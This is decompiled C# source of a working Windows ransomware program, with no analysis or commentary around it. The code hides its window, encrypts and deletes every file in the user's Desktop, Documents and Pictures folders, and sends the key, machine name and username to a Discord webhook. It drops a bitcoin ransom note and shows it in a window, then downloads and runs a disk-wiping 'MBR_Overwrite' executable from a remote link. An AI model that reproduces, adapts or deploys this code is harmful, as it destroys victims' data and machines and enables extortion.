using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Main;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".crypted";

	public string PcUsername = Environment.UserName;

	private string webhook = "https://discord.com/api/webhooks/844280621459308594/_l_LuuKSS1hynA9wrPQyg4EUrcNMI7pDTjdLR3nA6Rk5HiE-GA6iq2_YmSicCDG3YDKv";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "Your files are encrypted.\n\nIf you want to unlock them send 50$ worth of bitcoin to this address: 36yFAmBGNDowqjXxbaPA2F3byPUoxWfZyz\n\nAfter that email your transaction ID, pc code and username to: kabayaboo@protonmail.com\n\nAfter that wait for our response and we will send you your unique password and decryptor.\n\nEncrypted files:\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private Class1 class1 = new Class1();

	private Random randomID = new Random();

	private string epwd = "";

	private int progres;

	private IContainer components;

	private Label label1;

	private Label label2;

	private Label label3;

	private TextBox textBox1;

	private Label label4;

	private TextBox textBox2;

	private Label idLabel;

	private Label usernameLabel;

	private Label label5;

	public Timer timer1;

	private ProgressBar progressBar1;

	private Label label6;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
			WebClient webClient = new WebClient();
			string fileName = "C:\\\\Users\\\\" + Environment.UserName + "\\AppData\\Roaming\\one.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/763151279366078507/843147974720487454/MBR_Overwrite.exe", fileName);
			Process.Start(fileName);
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	public static void SendWebhook(string webhook_url, string msg, string username)
	{
		WebClient webClient = new WebClient();
		try
		{
			webClient.UploadValues(webhook_url, new NameValueCollection
			{
				{ "content", msg },
				{ "username", username }
			});
		}
		catch (WebException ex)
		{
			Console.WriteLine(ex.Message.ToString());
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\READ_ME.crypted.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_ShowInTaskbar(true);
		timer1.Start();
		((Control)usernameLabel).set_Text("Username: " + Environment.MachineName + "--" + Environment.UserName);
		int num = randomID.Next(9999999);
		((Control)idLabel).set_Text("PcID: " + num);
		string msg = "Encryption Password: " + epwd + "\n" + ((Control)idLabel).get_Text() + "\n" + ((Control)usernameLabel).get_Text();
		SendWebhook(webhook, msg, "Info");
		Settings1.Default.pcid = num.ToString();
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
	}

	private void encryptFolderContents(string sDir)
	{
		string password = (epwd = class1.MakePass());
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".crypted"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, password);
				}
			}
			files = Directory.GetDirectories(sDir);
			foreach (string sDir2 in files)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".crypted", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (progres == 100)
		{
			timer1.set_Enabled(false);
			timer1.Stop();
		}
		else
		{
			progres++;
			progressBar1.set_Value(progres);
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		_ = ((CancelEventArgs)(object)e).Cancel;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0248: Expected O, but got Unknown
		//IL_02cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d7: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected O, but got Unknown
		//IL_0456: Unknown result type (might be due to invalid IL or missing references)
		//IL_0460: Expected O, but got Unknown
		//IL_04cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d7: Expected O, but got Unknown
		//IL_05c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cc: Expected O, but got Unknown
		//IL_0736: Unknown result type (might be due to invalid IL or missing references)
		//IL_0740: Expected O, but got Unknown
		//IL_076c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0776: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		textBox1 = new TextBox();
		label4 = new Label();
		textBox2 = new TextBox();
		idLabel = new Label();
		usernameLabel = new Label();
		label5 = new Label();
		timer1 = new Timer(components);
		progressBar1 = new ProgressBar();
		label6 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(341, 33));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Your files are encrypted!");
		label1.set_TextAlign((ContentAlignment)2);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(12, 42));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(341, 42));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Your files are encrypted with strong algorith and \r\nno one can decrypt them without our key.");
		label2.set_TextAlign((ContentAlignment)2);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(12, 84));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(341, 78));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("If you want files back send 50$\r\nworth of bitcoin to this address:\r\n");
		label3.set_TextAlign((ContentAlignment)2);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_Location(new Point(12, 166));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(341, 24));
		((Control)textBox1).set_TabIndex(3);
		((Control)textBox1).set_Text("36yFAmBGNDowqjXxbaPA2F3byPUoxWfZyz");
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(13, 203));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(341, 104));
		((Control)label4).set_TabIndex(4);
		((Control)label4).set_Text("After that email us with your\r\nPcID, Username and Bitcoin\r\ntransactionID.\r\nEmail:");
		label4.set_TextAlign((ContentAlignment)2);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_Location(new Point(12, 310));
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(341, 24));
		((Control)textBox2).set_TabIndex(5);
		((Control)textBox2).set_Text("kabayaboo@protonmail.com");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)idLabel).set_Font(new Font("Microsoft Sans Serif", 12.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)idLabel).set_Location(new Point(12, 337));
		((Control)idLabel).set_Name("idLabel");
		((Control)idLabel).set_Size(new Size(341, 20));
		((Control)idLabel).set_TabIndex(6);
		((Control)idLabel).set_Text("PcID: ");
		((Control)usernameLabel).set_Font(new Font("Microsoft Sans Serif", 12.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)usernameLabel).set_Location(new Point(12, 357));
		((Control)usernameLabel).set_Name("usernameLabel");
		((Control)usernameLabel).set_Size(new Size(341, 22));
		((Control)usernameLabel).set_TabIndex(7);
		((Control)usernameLabel).set_Text("Username: ");
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_Location(new Point(9, 379));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(341, 40));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text("If you dont make payment in next\r\n6 hours your files will be deleted.");
		label5.set_TextAlign((ContentAlignment)2);
		timer1.set_Interval(216000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)progressBar1).set_Location(new Point(12, 430));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(338, 23));
		((Control)progressBar1).set_TabIndex(9);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_Location(new Point(12, 460));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(341, 57));
		((Control)label6).set_TabIndex(10);
		((Control)label6).set_Text("Warning\r\nIf you turn off your pc you will not be able to\r\nboot it up again!");
		label6.set_TextAlign((ContentAlignment)2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkCyan);
		((Form)this).set_ClientSize(new Size(365, 523));
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)usernameLabel);
		((Control)this).get_Controls().Add((Control)(object)idLabel);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Main");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
